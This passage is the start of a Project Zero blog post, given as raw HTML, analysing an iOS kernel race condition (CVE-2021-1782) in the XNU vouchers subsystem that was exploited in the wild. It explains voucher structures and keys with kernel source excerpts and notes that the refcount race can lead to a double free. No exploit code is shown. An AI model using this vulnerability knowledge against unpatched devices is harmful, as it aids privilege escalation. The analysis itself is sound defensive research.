New";color:#c53929;font-weight:400}.BGLtzooHlW-c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.BGLtzooHlW-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.BGLtzooHlW-c6{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.BGLtzooHlW-c12{border-spacing:0;border-collapse:collapse;margin-right:auto}.BGLtzooHlW-c27{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.BGLtzooHlW-c25{color:inherit;text-decoration:inherit}.BGLtzooHlW-c11{font-weight:400;font-family:"Courier New"}.BGLtzooHlW-c5{orphans:2;widows:2}.BGLtzooHlW-c1{height:0pt}.BGLtzooHlW-c14{font-style:italic}.BGLtzooHlW-c28{vertical-align:super}.BGLtzooHlW-c8{height:11pt}.BGLtzooHlW-c17{font-weight:700}.BGLtzooHlW-c22{margin-left:36pt}.BGLtzooHlW-c23{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="BGLtzooHlW-c27"&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;This blog post is my analysis of a vulnerability exploited in the wild and patched in early 2021. Like the &lt;/span&gt;&lt;span class="BGLtzooHlW-c9"&gt;&lt;a class="BGLtzooHlW-c251" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html"&gt;writeup published last week&lt;/a&gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;&amp;nbsp;looking at an ASN.1 parser bug, this blog post is based on the notes I took as I was analyzing the patch and trying to understand the XNU vouchers subsystem. I hope that this writeup serves as the missing documentation for how some of the internals of the voucher subsystem works and its quirks which lead to this vulnerability.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;CVE-2021-1782 was fixed in iOS 14.4, as noted by &lt;/span&gt;&lt;span class="BGLtzooHlW-c21"&gt;&lt;a class="BGLtzooHlW-c251" href="https://twitter.com/s1guza/status/1354575808547999744"&gt;@s1guza on twitter&lt;/a&gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c5 BGLtzooHlW-c24"&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5UykytcJVVshEICfc5vF3q6iAkVDug6bFDyqEnEef_apkVCB-AsGKCFPMqa6XZ2RoKPqjuU1CNiWBd4mszC0lGCNmSSby9dVqg_g3VCBM3cJodxCNij4Bqarp7ULqGkonXHyIEne3Uy6s1YcFUvfKmWlBSAvf8axjiw-4mJftHeL39CqTHjHTQ6TjnA/s1182/image1%20%283%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5UykytcJVVshEICfc5vF3q6iAkVDug6bFDyqEnEef_apkVCB-AsGKCFPMqa6XZ2RoKPqjuU1CNiWBd4mszC0lGCNmSSby9dVqg_g3VCBM3cJodxCNij4Bqarp7ULqGkonXHyIEne3Uy6s1YcFUvfKmWlBSAvf8axjiw-4mJftHeL39CqTHjHTQ6TjnA/s600/image1%20%283%29.png" border="0" alt="&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;" style="max-height: 750; max-width: 600;"title="&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;This vulnerability was fixed on January 26th 2021, and Apple updated the iOS 14.4 release notes on May 28th 2021 to indicate that the issue may have been actively exploited:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglDi2Ic9tjqDTmiUAyw4QdxMhp8ZfMxHrsvXHj4rZFBXekFKNzdmx1AT3tnAcuqLO4iGaft-2qx5EskhF2QpUjFFITHAA6qbAA_IP6H73a5DmEsx4Z4qbNySl7g6_ok8SS_1Iad36DvUmMFnFK1rfcK7LUFL4im07lD4SM6VsZMflgy4Zf2CGsvUWHEw/s1660/image2%20%282%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglDi2Ic9tjqDTmiUAyw4QdxMhp8ZfMxHrsvXHj4rZFBXekFKNzdmx1AT3tnAcuqLO4iGaft-2qx5EskhF2QpUjFFITHAA6qbAA_IP6H73a5DmEsx4Z4qbNySl7g6_ok8SS_1Iad36DvUmMFnFK1rfcK7LUFL4im07lD4SM6VsZMflgy4Zf2CGsvUWHEw/s600/image2%20%282%29.png" border="0" alt="Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021" style="max-height: 750; max-width: 600;"title="Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.iaaooqfddqk2"&gt;&lt;span class="BGLtzooHlW-c20"&gt;Vouchers&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;What exactly is a voucher?&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;The kernel code has a concise description:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c22"&gt;&lt;span class="BGLtzooHlW-c14 BGLtzooHlW-c26"&gt;Vouchers are a reference counted immutable (once-created) set of indexes to particular resource manager attribute values (which themselves are reference counted).&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;That definition is technically correct, though perhaps not all that helpful by itself.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;To actually understand the root cause and exploitability of this vulnerability is going to require covering a lot of the voucher codebase. This part of XNU is pretty obscure, and pretty complicated.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;A voucher is a reference-counted table of keys and values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Pointers to all created vouchers are stored in the global &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivht_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;For a particular set of keys and values there should only be one voucher object. During the creation of a voucher there is a deduplication stage where the new voucher is compared against all existing vouchers in the hashtable to ensure they remain unique, returning a reference to the existing voucher if a duplicate has been found.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Here&amp;#39;s the structure of a voucher:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.172bf3f0517e74698dccf6803d0a7cba3e4db4b2"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* checksum hash */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* checksum of values */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; os_refcnt_t &amp;nbsp; &amp;nbsp;iv_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* reference count */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* size of the voucher table */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_inline_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_ENTRIES_INLINE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_entry_t &amp;nbsp; &amp;nbsp; iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* table of voucher attr entries */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_port_t &amp;nbsp; &amp;nbsp; iv_port&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* port representing the voucher */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; queue_chain_t &amp;nbsp;iv_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* link on hash chain */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_ENTRIES_INLINE MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;The voucher codebase is written in a very generic, extensible way, even though its actual use and supported feature set is quite minimal.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.ws3slh7jndn7"&gt;&lt;span class="BGLtzooHlW-c20"&gt;Keys&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Keys in vouchers are not arbitrary. Keys are &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;indexes&lt;/span&gt;&lt;span&gt;&amp;nbsp;into a voucher&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;; a value&amp;#39;s position in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;table determines what &amp;quot;key&amp;quot; it was stored under. Whilst the vouchers codebase supports the runtime addition of new key types this feature isn&amp;#39;t used and there are just a small number of fixed, well-known keys:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bb8dc8863bbdd47aa96ca2a52c637e312485af31"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)~&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* other well-known-keys will be added here */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ATM &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_IMPORTANCE &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;2&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_BANK &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;3&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_PTHPRIORITY &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;4&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;7&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_TEST &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;8&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;#define&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN MACH_VOUCHER_ATTR_KEY_TEST&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_inline_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;has 8 entries. But of those, only four are actually supported and have any associated functionality. The ATM voucher attributes are deprecated and the code supporting them is gone so only IMPORTANCE (2), BANK (3), PTHPRIORITY (4) and USER_DATA (7) are valid keys. There&amp;#39;s some confusion (perhaps on my part) about when exactly you should use the term key and when attribute; I&amp;#39;ll use them interchangeably to refer to these key values and the corresponding &amp;quot;types&amp;quot; of values which they manage. More on that later.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.z3ifj5rlshxh"&gt;&lt;span class="BGLtzooHlW-c20"&gt;Values&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Each entry in a voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_index_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.adadf70a01ef64fd38d16dcc040ece0a87975524"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;typedef&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;natural_t iv_index_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Each value is again an index; this time into a &lt;/span&gt;&lt;span class="BGLtzooHlW-c14"&gt;per-key&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;cache of values, abstracted as a &amp;quot;Voucher Attribute Cache Control Object&amp;quot; represented by this structure:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.34f3e7551949b227b144fa7c23780e56054cf088"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; 